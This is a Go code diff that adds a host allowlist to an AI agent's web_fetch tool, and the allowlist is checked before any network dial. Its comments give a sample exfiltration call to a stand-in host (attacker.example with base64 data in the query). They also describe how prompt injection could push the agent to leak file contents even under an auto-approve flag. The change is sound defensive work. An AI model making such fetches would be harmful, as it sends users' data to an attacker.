@@ -116,12 +116,60 @@ func normalizeResolverHost(host string) string {
 // WebFetchTool does an HTTP GET, converts HTML to text, and returns a
 // token-budgeted excerpt. Not a full browser — skips JavaScript, follows up
 // to 5 redirects.
-type WebFetchTool struct{}
+//
+// AllowedHosts (when non-empty) is the egress allowlist: defense-in-
+// depth that fires BEFORE the SSRF transport guard so a tainted
+// `web_fetch https://attacker.example/?d=<base64>` is refused even
+// when `DFMC_APPROVE=yes` would have silently auto-approved it.
+// Empty list disables the check (preserves prior behavior).
+type WebFetchTool struct {
+	AllowedHosts []string
+}
 
 func NewWebFetchTool() *WebFetchTool { return &WebFetchTool{} }
 func (t *WebFetchTool) Name() string { return "web_fetch" }
 func (t *WebFetchTool) Description() string {
 	return "Fetch a URL and return its text content (HTML stripped)."
+}
+
+// SetAllowedHosts wires the egress allowlist from config. Called by
+// the engine constructor (engine_register_defaults.go) so the tool
+// instance carries the policy that was loaded at startup.
+func (t *WebFetchTool) SetAllowedHosts(hosts []string) {
+	t.AllowedHosts = append(t.AllowedHosts[:0], hosts...)
+}
+
+// hostAllowed checks `host` against the configured allowlist. Returns
+// (true, "") when the allowlist is empty (opt-in: no policy → allow).
+// Otherwise returns (true, "") when host matches an exact entry or
+// a "*.suffix" wildcard, and (false, reason) otherwise. Matching is
+// case-insensitive on host; entries may include ports (rarely needed)
+// but normal usage passes hostnames only.
+func hostAllowed(host string, allow []string) (bool, string) {
+	if len(allow) == 0 {
+		return true, ""
+	}
+	h := strings.ToLower(strings.TrimSpace(host))
+	if h == "" {
+		return false, "host is empty"
+	}
+	for _, raw := range allow {
+		entry := strings.ToLower(strings.TrimSpace(raw))
+		if entry == "" {
+			continue
+		}
+		if strings.HasPrefix(entry, "*.") {
+			suffix := entry[1:] // includes the leading dot, e.g. ".github.com"
+			if strings.HasSuffix(h, suffix) {
+				return true, ""
+			}
+			continue
+		}
+		if h == entry {
+			return true, ""
+		}
+	}
+	return false, fmt.Sprintf("host %q is not on the web_fetch allowlist (%d entries configured). Add it to cfg.WebFetch.AllowedHosts or use a more specific tool", host, len(allow))
 }
 
 func (t *WebFetchTool) Execute(ctx context.Context, req Request) (Result, error) {
@@ -143,6 +191,15 @@ func (t *WebFetchTool) Execute(ctx context.Context, req Request) (Result, error)
 				"file://, ftp://, data:, javascript:, and bare hostnames without a scheme are rejected",
 			raw, scheme,
 			`{"name":"web_fetch","args":{"url":"https://example.com/path"}}`)
+	}
+	// Egress allowlist check happens BEFORE the dial so a tainted URL
+	// (data exfiltration from a recent read_file via the LLM-prompt-
+	// injection path) is refused at the tool boundary, not at the
+	// transport — and the refusal happens regardless of any
+	// DFMC_APPROVE auto-yes flow that bypassed the per-tool approval.
+	hostForCheck := u.Hostname()
+	if ok, reason := hostAllowed(hostForCheck, t.AllowedHosts); !ok {
+		return Result{}, fmt.Errorf("web_fetch refused: %s", reason)
 	}
 	maxBytes := asInt(req.Params, "max_bytes", 128*1024)
 	if maxBytes <= 0 {
